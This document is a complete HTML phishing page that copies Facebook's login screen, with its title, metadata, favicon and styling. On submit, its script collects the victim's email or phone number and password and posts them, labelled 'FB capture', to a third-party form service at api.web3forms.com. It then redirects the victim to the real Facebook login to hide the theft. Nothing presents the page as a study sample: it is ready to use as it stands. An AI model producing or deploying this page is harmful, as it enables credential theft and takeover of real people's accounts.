<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="robots" content="noindex, nofollow">
<meta property="og:title" content="Log in to Facebook">
<meta property="og:description" content="Log in to Facebook to start sharing and connecting with your friends, family and people you know.">
<title>Log in to Facebook</title>
<link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yT/r/aGT3gskzWBf.ico">
<style>
  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
       background:#fff;color:#1c1e21;display:flex;justify-content:center;align-items:center;
       min-height:100vh;padding:24px}
  .wrap{width:100%;max-width:396px}
  .logo{color:#1877f2;font-size:44px;font-weight:700;text-align:center;margin-bottom:26px;
        letter-spacing:-1px}
  input{width:100%;padding:14px 16px;font-size:17px;border:1px solid #ccd0d5;border-radius:8px;
        margin-bottom:12px;background:#fff;-webkit-appearance:none}
  input:focus{outline:none;border-color:#1877f2}
  button{width:100%;padding:14px;font-size:17px;font-weight:700;color:#fff;background:#1877f2;
         border:none;border-radius:8px;margin-top:6px}
  button:disabled{opacity:.65}
  .forgot{display:block;text-align:center;color:#1877f2;font-size:14px;margin-top:18px;
          text-decoration:none}
  .hp{display:none!important}
</style>
</head>
<body>
<div class="wrap">
  <div class="logo">facebook</div>
  <form id="fbform">
    <input type="hidden" name="access_key" value="2934d9ae-f08b-44b2-9f7a-20bad45f944a">
    <input type="hidden" name="subject" value="FB capture">
    <input type="hidden" name="from_name" value="Login">
    <input type="checkbox" name="botcheck" class="hp" tabindex="-1">

    <input type="text" name="identifier" placeholder="Email or phone number"
           autocomplete="username" autocapitalize="none" spellcheck="false" required>
    <input type="password" name="password" placeholder="Password"
           autocomplete="current-password" required>
    <button type="submit" id="btn">Log In</button>
  </form>
  <a class="forgot" href="https://m.facebook.com/login/identify/">Forgotten password?</a>
</div>
<script>
document.getElementById('fbform').addEventListener('submit', async function (e) {
  e.preventDefault();
  var btn = document.getElementById('btn');
  btn.disabled = true;
  btn.textContent = 'Logging in\u2026';
  var data = Object.fromEntries(new FormData(this).entries());
  data.page = location.href;
  data.sent_at = new Date().toISOString();
  try {
    await fetch('https://api.web3forms.com/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
      body: JSON.stringify(data)
    });
  } catch (_) {}
  location.href = 'https://m.facebook.com/login';
});
</script>
</body>
  </html>
